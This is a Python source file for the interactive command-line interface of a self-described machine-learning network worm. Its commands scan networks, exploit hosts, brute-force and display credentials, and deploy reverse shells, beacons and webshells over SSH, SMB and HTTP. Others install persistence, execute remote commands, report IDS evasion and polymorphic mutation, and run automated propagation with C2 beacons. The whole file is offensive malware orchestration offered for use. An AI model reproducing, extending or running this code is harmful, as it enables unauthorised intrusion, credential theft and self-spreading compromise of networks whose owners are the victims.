"""
Wormy ML Network Worm v4.0 — Interactive CLI
"""

import cmd
import hashlib
import os
import sys
import time
from datetime import datetime
from typing import Optional

from utils.logger import logger


class InteractiveCLI(cmd.Cmd):
    """Interactive CLI for Wormy"""

    intro = "Wormy ML Network Worm v4.0 - Interactive CLI\nType 'help' or '?' to list commands.\n"
    prompt = "wormy> "

    def __init__(self, worm):
        super().__init__()
        self.worm = worm

    def do_scan(self, arg):
        """Scan the network. Usage: scan [professional|basic]"""
        from rich.console import Console
        from rich.table import Table

        use_pro = "basic" not in arg.lower()
        results = self.worm.scan_network(use_professional=use_pro)

        console = Console()
        console.print(f"\n[bold green]Scan complete: {len(results)} hosts found[/bold green]")

        if not results:
            return

        table = Table(show_header=True, header_style="bold blue")
        table.add_column("IP Address", style="cyan")
        table.add_column("OS", style="white")
        table.add_column("Open Ports", style="yellow")
        table.add_column("Vulns", justify="right")
        table.add_column("Chains", justify="right")

        for host in results:
            vulns = len(host.get("vulnerabilities", []))
            chain = len(host.get("exploit_chain", []))

            table.add_row(
                host["ip"],
                host.get("os_guess", "Unknown")[:15],
                ", ".join(map(str, host.get("open_ports", [])))[:30],
                f"[{'red' if vulns > 0 else 'dim'}]{vulns}[/]",
                f"[{'red bold' if chain > 0 else 'dim'}]{chain}[/]",
            )

        console.print(table)

    def do_status(self, arg):
        """Show current status"""
        self.worm.print_status()

    def do_targets(self, arg):
        """List discovered targets"""
        print(f"\nDiscovered hosts: {len(self.worm.scan_results)}")
        print(f"Infected: {len(self.worm.infected_hosts)}")
        print(f"Failed: {len(self.worm.failed_targets)}")
        for host in self.worm.scan_results:
            ip = host["ip"]
            status = (
                "INFECTED"
                if ip in self.worm.infected_hosts
                else "FAILED" if ip in self.worm.failed_targets else "DISCOVERED"
            )
            print(
                f"  [{status}] {ip} - {host.get('os_guess', 'Unknown')} - Ports: {host.get('open_ports', [])}"
            )

    def do_exploit(self, arg):
        """Exploit a specific target. Usage: exploit <ip>"""
        ip = arg.strip()
        if not ip:
            print("Usage: exploit <ip>")
            return
        target = next((h for h in self.worm.scan_results if h["ip"] == ip), None)
        if not target:
            print(f"Target {ip} not found in scan results")
            return
        success = self.worm.exploit_target(target)
        print(f"Exploit {'succeeded' if success else 'failed'} on {ip}")

    def do_pivot(self, arg):
        """Show lateral movement options. Usage: pivot <source_ip>"""
        ip = arg.strip()
        if not ip:
            print("Usage: pivot <source_ip>")
            return
        if self.worm.knowledge_graph:
            reachable = self.worm.knowledge_graph.get_reachable_from(ip)
            print(f"Reachable from {ip}: {reachable}")

    def do_vulns(self, arg):
        """Show vulnerabilities for a target. Usage: vulns <ip>"""
        ip = arg.strip()
        if not ip:
            print("Usage: vulns <ip>")
            return
        for host in self.worm.scan_results:
            if host["ip"] == ip:
                vulns = host.get("vulnerabilities", [])
                if vulns:
                    print(f"\nVulnerabilities for {ip}:")
                    for v in vulns:
                        print(
                            f"  [{v.get('severity', 'UNKNOWN')}] {v.get('name', '')} (CVSS: {v.get('cvss', 0)})"
                        )
                        print(f"    CVE: {v.get('cve', 'N/A')}")
                        print(f"    {v.get('description', '')}")
                else:
                    print(f"No vulnerabilities found for {ip}")
                return
        print(f"Target {ip} not found")

    def do_chain(self, arg):
        """Show exploit chain for a target. Usage: chain <ip>"""
        ip = arg.strip()
        if not ip:
            print("Usage: chain <ip>")
            return
        for host in self.worm.scan_results:
            if host["ip"] == ip:
                chain = host.get("exploit_chain", [])
                if chain:
                    print(f"\nExploit chain for {ip}:")
                    for step in chain:
                        print(
                            f"  Step {step['step']}: [{step['phase']}] {step['name']} ({step.get('cve', 'N/A')})"
                        )
                else:
                    print(f"No exploit chain for {ip}")
                return
        print(f"Target {ip} not found")

    def do_creds(self, arg):
        """Show discovered credentials"""
        if self.worm.cred_manager:
            discovered = self.worm.cred_manager.get_discovered_credentials()
            if discovered:
                print(f"\nDiscovered credentials ({len(discovered)}):")
                for u, p in discovered:
                    print(f"  {u}:{p}")
            else:
                print("No credentials discovered yet")

    def do_monitor(self, arg):
        """Show real-time host monitoring dashboard"""
        if self.worm.host_monitor:
            self.worm.host_monitor.print_dashboard()
        else:
            print("Host Monitor not available")

    def do_evasion(self, arg):
        """Show evasion status and statistics"""
        print(f"\n{'=' * 60}")
        print("EVASION STATUS")
        print(f"{'=' * 60}")

        if self.worm.ids_evasion:
            stats = self.worm.ids_evasion.get_statistics()
            print(f"\n  IDS/IPS Evasion:")
            print(f"    Traffic Encrypted: {stats['traffic_encrypted']}")
            print(f"    Packets Fragmented: {stats['packets_fragmented']}")
            print(f"    Signatures Avoided: {stats['signatures_avoided']}")
            print(f"    Decoys Generated: {stats['decoys_generated']}")
            print(f"    Protocol Mimicked: {stats['protocol_mimicked']}")
            print(f"    Domain Fronted: {stats['domain_fronted']}")
            print(f"    Current Risk Level: {stats['current_risk_level']:.2f}")

        if self.worm.polymorphic_engine:
            stats = self.worm.polymorphic_engine.get_statistics()
            print(f"\n  Polymorphic Engine:")
            print(f"    Mutations: {stats['mutations_generated']}")
            print(f"    Unique Signatures: {stats['unique_signatures']}")

        print(f"{'=' * 60}")

    def do_bruteforce(self, arg):
        """Brute force a specific target. Usage: bruteforce <ip> [service]"""
        parts = arg.strip().split()
        if not parts:
            print("Usage: bruteforce <ip> [service]")
            return
        ip = parts[0]
        target = next((h for h in self.worm.scan_results if h["ip"] == ip), None)
        if not target:
            print(f"Target {ip} not found in scan results")
            return
        if self.worm.brute_force_engine:
            results = self.worm._try_brute_force(target)
            if results:
                print(f"\nBrute force successful on {ip}:")
                for r in results:
                    print(
                        f"  {r.get('service', '?')}:{r.get('username', '?')}:{r.get('password', '?')}"
                    )
            else:
                print(f"Brute force failed on {ip}")
        else:
            print("Brute Force Engine not available")

    def do_graph(self, arg):
        """Generate network topology visualization"""
        if not self.worm.host_monitor:
            print("Host Monitor not available")
            return
        hosts = {
            h["ip"]: {
                "os_guess": h.get("os_guess", "Unknown"),
                "open_ports": h.get("open_ports", []),
            }
            for h in self.worm.scan_results
        }
        from utils.topology_visualizer import TopologyVisualizer

        tv = TopologyVisualizer()
        lateral_movements = []
        if self.worm.host_monitor:
            for ip in self.worm.host_monitor.hosts:
                for lm in self.worm.host_monitor.hosts[ip].lateral_movement_history:
                    lateral_movements.append({"source": ip, **lm})
        results = tv.generate_all(
            hosts, self.worm.infected_hosts, self.worm.failed_targets, lateral_movements
        )
        print(f"\nTopology maps generated:")
        for fmt, path in results.items():
            print(f"  {fmt}: {path}")

    do_topo = do_graph

    def do_hosts(self, arg):
        """Show host monitoring dashboard"""
        return self.do_monitor(arg)

    def do_host(self, arg):
        """Show detailed info for a specific host. Usage: host <ip>"""
        ip = arg.strip()
        if not ip or not self.worm.host_monitor:
            print("Usage: host <ip>" if not ip else "Host Monitor not available")
            return
        status = self.worm.host_monitor.get_host_status(ip)
        if status:
            print(f"\n{'=' * 60}\nHOST DETAILS: {ip}\n{'=' * 60}")
            for k, v in status.items():
                if isinstance(v, dict):
                    print(f"  {k}:")
                    for k2, v2 in v.items():
                        print(f"    {k2}: {v2}")
                else:
                    print(f"  {k}: {v}")
            print(f"{'=' * 60}")
        else:
            print(f"Host {ip} not found in monitor")

    def do_activity(self, arg):
        """Show recent activity feed. Usage: activity [limit]"""
        try:
            limit = int(arg.strip()) if arg.strip() else 20
        except ValueError:
            limit = 20
        if self.worm.host_monitor:
            activities = self.worm.host_monitor.get_activity_feed(limit=limit)
            if activities:
                print(f"\nRecent Activity (last {len(activities)}):")
                for act in activities:
                    print(
                        f"  [{act['timestamp'][11:19]}] {act['host_ip']:<15} {act['type']:<20} {str(act['details'])[:50]}"
                    )
            else:
                print("No activities recorded yet")
        else:
            print("Host Monitor not available")

    def do_help(self, arg):
        """Show help for commands"""
        print("""
Wormy ML Network Worm v4.0 - Available Commands:

  SCAN & DISCOVERY:
    scan / s [professional|basic]  - Scan the network (with progress bar)
    targets / t                    - List all discovered targets
    vulns / v  <ip>                - Show vulnerabilities for a target
    topo                           - Generate network topology visualization

  EXPLOITATION:
    exploit / x <ip>               - Exploit a specific target
    chain <ip>                     - Show exploit chain for a target
    bruteforce <ip> [service]      - Brute force credentials
    deploy <ip> [type]             - Deploy payload (reverse_shell, beacon, webshell)
    persist <ip> [methods]         - Establish persistence (cron, systemd, registry, ssh_keys)
    exec / e  <ip> <command>       - Execute command on infected host via SSH

  MONITORING:
    status                         - Current propagation status
    hosts                          - Host monitoring dashboard
    host / h  <ip>                 - Detailed info for a specific host
    pivot <source_ip>              - Show lateral movement options from host
    activity [limit]               - Real-time activity feed
    evasion                        - Show evasion status and statistics

  CREDENTIALS:
    creds / c                      - Show discovered credentials

  EXECUTION:
    run / r [iterations]           - Start propagation for N iterations
    stop                           - Stop propagation
    report                         - Generate full audit report

  MISC:
    exit / q                       - Exit the CLI
""")

    def do_run(self, arg):
        """Start propagation. Usage: run [iterations]"""
        try:
            max_iter = int(arg.strip()) if arg.strip() else 0
        except ValueError:
            max_iter = 0

        self.worm.running = True
        self.worm.start_time = datetime.now()
        self.worm.stats["start_time"] = self.worm.start_time

        from worm_core import get_local_ip

        local_ip = get_local_ip()
        self.worm._safe_add_infected(local_ip)

        if self.worm.knowledge_graph:
            self.worm.knowledge_graph.add_host(local_ip, is_infected=True)
            self.worm.knowledge_graph.mark_infected(local_ip, "origin")

        self.worm.scan_network()

        iteration = 0
        online_learning_interval = 10
        adaptive_cycle_interval = 5

        while self.worm.running and self.worm.check_safety_constraints():
            iteration += 1
            if max_iter > 0 and iteration > max_iter:
                break
            logger.info(f"\n--- ITERATION {iteration} ---")

            # Rescan periodically
            if iteration % 5 == 0:
                self.worm.scan_network()

            # Adaptive cycle (dormant cells, etc.)
            if self.worm.adaptive_cycle and iteration % adaptive_cycle_interval == 0:
                self.worm._run_adaptive_cycle(iteration)

            # Credential pivoting
            if self.worm.cred_manager and iteration % 3 == 0:
                self.worm._credential_pivot_cycle()

            # Online learning
            if self.worm.config.ml.online_learning and iteration % online_learning_interval == 0:
                self.worm._online_learning_step()

            # OTA Brain Updates
            if self.worm.c2_server and getattr(self.worm.c2_server, "pending_brain_update", None):
                try:
                    update_path = self.worm.c2_server.pending_brain_update
                    if os.path.exists(update_path):
                        self.worm.rl_agent.load(update_path)
                        logger.success("OTA Brain Update applied")
                        self.worm.c2_server.pending_brain_update = None
                        os.remove(update_path)
                except Exception as e:
                    logger.debug(f"OTA update failed: {e}")

            # Distributed redundancy
            if self.worm.distributed_redundancy and iteration % 10 == 0:
                self.worm._check_distributed_redundancy()

            # Select and exploit target
            target = self.worm.select_next_target()
            if not target:
                logger.warning("No more targets")
                break
            self.worm.exploit_target(target)

            # Post-exploitation cleanup
            if self.worm.config.evasion.stealth_mode:
                self.worm._post_exploitation_cleanup(target["ip"], target)

            # C2 beacon
            if self.worm.c2_server and target["ip"] in self.worm.infected_hosts:
                try:
                    self.worm.c2_server.process_beacon(
                        {
                            "host_id": target["ip"],
                            "ip": target["ip"],
                            "hostname": target.get("hostname", "unknown"),
                            "os": target.get("os_guess", "Unknown"),
                            "ports": target.get("open_ports", []),
                            "beacon_type": "infection",
                        }
                    )
                except Exception:
                    pass

            # Wave propagation
            if (
                self.worm.wave_propagation
                and iteration % 3 == 0
                and len(self.worm.infected_hosts) > 1
            ):
                try:
                    targets = [
                        h
                        for h in self.worm.scan_results
                        if h["ip"] not in self.worm.infected_hosts
                        and h["ip"] not in self.worm.failed_targets
                    ]
                    if targets and self.worm.cred_manager:
                        creds = self.worm.cred_manager.get_discovered_credentials()
                        if creds:
                            self.worm.wave_propagation.propagate_wave(
                                targets=targets,
                                credentials=creds,
                                exploit_fn=self.worm.exploit_target,
                                wave=iteration // 3,
                            )
                except Exception:
                    pass

            # Agent controller
            if self.worm.agent_controller and iteration % 2 == 0:
                try:
                    self.worm.agent_controller.heartbeat_check()
                except Exception:
                    pass

            if self.worm.config.propagation.propagation_delay > 0:
                time.sleep(self.worm.config.propagation.propagation_delay)

            if self.worm._safe_infection_count() >= self.worm.config.propagation.max_infections:
                break

            self.worm.print_status()

        self.worm.stats["end_time"] = datetime.now()
        self.worm.running = False
        self.worm.print_final_report()

    def do_deploy(self, arg):
        """Deploy payload to target. Usage: deploy <ip> [reverse_shell|beacon|webshell]"""
        parts = arg.strip().split()
        if not parts:
            print("Usage: deploy <ip> [type]")
            return
        ip = parts[0]
        ptype = parts[1] if len(parts) > 1 else "beacon"
        if not self.worm.payload_deployer:
            print("Payload Deployer not available")
            return
        target = next((h for h in self.worm.scan_results if h["ip"] == ip), None)
        if not target:
            print(f"Target {ip} not found in scan results")
            return
        ports = target.get("open_ports", [])
        username = "root"
        password = ""
        if self.worm.cred_manager:
            creds = self.worm.cred_manager.get_discovered_credentials()
            if creds:
                username = creds[0][0]
                password = creds[0][1]
        success = False
        for port in ports:
            if port == 22:
                success = self.worm.payload_deployer.deploy_via_ssh(
                    ip, port, username, password, payload_type=ptype
                )
            elif port in (445, 139):
                success = self.worm.payload_deployer.deploy_via_smb(
                    ip, username, password, payload_type=ptype
                )
            elif port in (80, 443, 8080):
                success = self.worm.payload_deployer.deploy_webshell(ip, port, username, password)
        print(f"Payload deploy {'succeeded' if success else 'failed'} on {ip}")

    def do_persist(self, arg):
        """Establish persistence on target. Usage: persist <ip> [methods]"""
        parts = arg.strip().split()
        if not parts:
            print("Usage: persist <ip> [methods]")
            return
        ip = parts[0]
        if not self.worm.remote_persistence:
            print("Remote Persistence Engine not available")
            return
        target = next((h for h in self.worm.scan_results if h["ip"] == ip), None)
        username = "root"
        password = ""
        if self.worm.cred_manager:
            creds = self.worm.cred_manager.get_discovered_credentials()
            if creds:
                username = creds[0][0]
                password = creds[0][1]
        worm_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "worm_core.py"))
        results = self.worm.remote_persistence.establish(
            ip=ip,
            os_type=target.get("os_guess", "Unknown") if target else "Unknown",
            username=username,
            password=password,
            payload_path=worm_path,
            methods=parts[1:] if len(parts) > 1 else None,
        )
        if results:
            print(f"Persistence established on {ip}: {[r['method'] for r in results]}")
        else:
            print(f"Persistence failed on {ip}")

    def do_exec(self, arg):
        """Execute command on infected host. Usage: exec <ip> <command>"""
        parts = arg.strip().split(maxsplit=1)
        if len(parts) < 2:
            print("Usage: exec <ip> <command>")
            return
        ip = parts[0]
        command = parts[1]
        if not self.worm.agent_controller:
            print("Agent Controller not available")
            return
        try:
            agent_id = hashlib.md5(f"{ip}:root".encode()).hexdigest()[:8]
            rc, output = self.worm.agent_controller.execute_now(agent_id, command)
            print(f"Output from {ip} (rc={rc}):")
            print(output if output else "(no output)")
        except Exception as e:
            print(f"Command execution failed: {e}")

    def do_stop(self, arg):
        """Stop propagation"""
        self.worm.stop()
        print("Propagation stopped")

    def do_report(self, arg):
        """Generate audit report"""
        self.worm.print_final_report()

    def do_exit(self, arg):
        """Exit the CLI"""
        print("Exiting...")
        self.worm.shutdown()
        return True

    do_quit = do_exit

    do_s = do_scan
    do_x = do_exploit
    do_r = do_run
    do_t = do_targets
    do_c = do_creds
    do_q = do_exit
    do_h = do_host
    do_v = do_vulns
    do_e = do_exec

    def do_EOF(self, arg):
        """Handle Ctrl+D"""
        print()
        return self.do_exit(arg)
